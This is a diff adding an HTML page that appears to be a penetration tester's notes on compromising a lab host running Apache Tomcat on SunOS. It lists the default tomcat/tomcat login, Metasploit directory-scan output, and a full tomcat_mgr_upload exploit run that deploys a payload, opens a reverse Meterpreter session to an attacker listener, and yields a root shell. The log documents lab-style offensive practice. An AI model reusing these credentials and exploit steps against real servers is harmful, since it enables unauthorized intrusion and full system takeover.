@@ -1,0 +1,41 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>10.11.1.209 Kraken -- Sunos</title>
+</head><body>https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote<br/>
+<br/>
+<br/>
+default password tomcat/tomcat<br/>
+<br/>
+<br/>
+[*] Detecting error code<br/>
+[*] Using code '404' as not found for 10.11.1.209<br/>
+[*] Found http://10.11.1.209:8080/admin/ 404 (10.11.1.209)<br/>
+[*] Found http://10.11.1.209:8080/jsp-examples/ 200 (10.11.1.209)<br/>
+[*] Found http://10.11.1.209:8080/tomcat-docs/ 200 (10.11.1.209)<br/>
+[*] Found http://10.11.1.209:8080/webdav/ 404 (10.11.1.209)<br/>
+[*] Scanned 1 of 1 hosts (100% complete)<br/>
+[*] Auxiliary module execution completed<br/>
+msf auxiliary(dir_scanner) &gt; search tomcat<br/>
+<br/>
+<br/>
+msf exploit(tomcat_mgr_upload) &gt; run<br/>
+<br/>
+[*] Started reverse TCP handler on 10.11.0.175:4444 <br/>
+[*] Retrieving session ID and CSRF token...<br/>
+[*] Uploading and deploying zzC35K0Nhsgq1KsLhDVV7T...<br/>
+[*] Executing zzC35K0Nhsgq1KsLhDVV7T...<br/>
+[*] Undeploying zzC35K0Nhsgq1KsLhDVV7T ...<br/>
+[*] Sending stage (46089 bytes) to 10.11.1.209<br/>
+[*] Meterpreter session 1 opened (10.11.0.175:4444 -&gt; 10.11.1.209:32991) at 2017-03-19 17:14:06 -0400<br/>
+<br/>
+meterpreter &gt; shell<br/>
+Process 1 created.<br/>
+Channel 1 created.<br/>
+id<br/>
+uid=0(root) gid=0(root)<br/>
+uname<br/>
+SunOS<br/>
+<br/>
+</body></html>
